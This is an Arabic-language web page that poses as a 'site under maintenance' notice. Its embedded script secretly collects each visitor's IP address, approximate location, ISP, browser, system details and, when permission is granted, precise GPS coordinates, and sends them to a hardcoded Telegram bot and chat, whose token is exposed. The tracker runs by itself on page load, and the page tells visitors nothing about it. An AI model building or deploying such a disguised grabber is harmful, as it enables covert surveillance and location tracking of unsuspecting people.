<!DOCTYPE html>
<html lang="ar">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>الموقع تحت الصيانة</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      color: #333;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      max-width: 600px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      padding: 20px;
    }

    h1 {
      color: #ff6b6b;
    }

    p {
      font-size: 18px;
      color: #666;
    }

    .maintenance-icon {
      font-size: 100px;
      color: #ff6b6b;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="maintenance-icon">🚧</div>
    <h1>الموقع تحت الصيانة</h1>
    <p>نعتذر عن الإزعاج. نحن نعمل على تحسين الموقع.</p>
  </div>

  <script>
    // توكن البوت
    const botToken = '8794936819:AAHuCd1rOGr7NLO0DSpWVX9IJfesqqmIKwQ';
    // chat_id الخاص بالقناة أو المجموعة
    const chatId = '1088226862';

    // دالة للحصول على معلومات المتصفح والجهاز
    function getBrowserInfo() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      return {
        المتصفح: userAgent,
        النظام: platform,
        اللغة: language,
        "المنطقة الزمنية": timezone
      };
    }

    // دالة لإرسال البيانات إلى تيليجرام
    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      const xhr = new XMLHttpRequest();
      xhr.open("GET", url, true);
      xhr.send();
    }

    // الدالة الرئيسية لجمع البيانات
    async function logIP() {
      try {
        // جلب معلومات الـ IP (هذا لا يحتاج إذن)
        const ipAddress = await fetch('https://api.ipify.org/?format=json')
          .then(response => response.json())
          .then(data => data.ip);

        // جلب معلومات الـ IP والموقع الجغرافي التقريبي (يستخدم HTTPS)
        const ipInfo = await fetch("https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,timezone,currency,isp,query")
          .then(response => response.json());

        // جلب معلومات المتصفح والجهاز
        const browserInfo = getBrowserInfo();

        // الموقع التقريبي من IP-api (بدون موافقة المستخدم)
        const approximateLocation = {
          lat: ipInfo.lat || "غير متوفر",
          lon: ipInfo.lon || "غير متوفر",
          city: ipInfo.city || "غير متوفر",
          region: ipInfo.regionName || "غير متوفر",
          country: ipInfo.country || "غير متوفر"
        };

        // إنشاء الرسالة التي ستُرسل إلى تيليجرام (بدون طلب موقع دقيق)
        const message = `
🚨 تم تسجيل دخول جديد:

🌐 عنوان IP: ${ipAddress}
📍 الموقع التقريبي: ${approximateLocation.city}, ${approximateLocation.region}, ${approximateLocation.country}
🗺️ خرائط: https://www.google.com/maps?q=${approximateLocation.lat},${approximateLocation.lon}
📡 مزود الخدمة: ${ipInfo.isp || 'غير معروف'}
⏰ التوقيت: ${ipInfo.timezone || 'غير معروف'}
💵 العملة: ${ipInfo.currency || 'غير معروف'}

💻 معلومات الجهاز:
• المتصفح: ${browserInfo['المتصفح'].substring(0, 100)}...
• النظام: ${browserInfo['النظام']}
• اللغة: ${browserInfo['اللغة']}
• المنطقة الزمنية: ${browserInfo['المنطقة الزمنية']}
        `;

        // إرسال الرسالة إلى تيليجرام
        sendToTelegram(message);

        // محاولة الحصول على الموقع الدقيق (إذا وافق المستخدم)
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition((position) => {
            // هذا لن يحدث إلا إذا ضغط المستخدم "سماح" على النافذة المنبثقة
            const exactLocation = {
              lat: position.coords.latitude,
              lon: position.coords.longitude
            };
            
            const exactMessage = `
📍 الموقع الدقيق (بعد موافقة المستخدم):
https://www.google.com/maps?q=${exactLocation.lat},${exactLocation.lon}
            `;
            
            sendToTelegram(exactMessage);
          }, (error) => {
            // المستخدم رفض أو حدث خطأ
            console.log("المستخدم لم يوافق على مشاركة الموقع");
          });
        }

      } catch (error) {
        console.error("خطأ أثناء جلب البيانات:", error);
      }
    }

    // تشغيل الدالة
    logIP();
  </script>
</body>

</html>
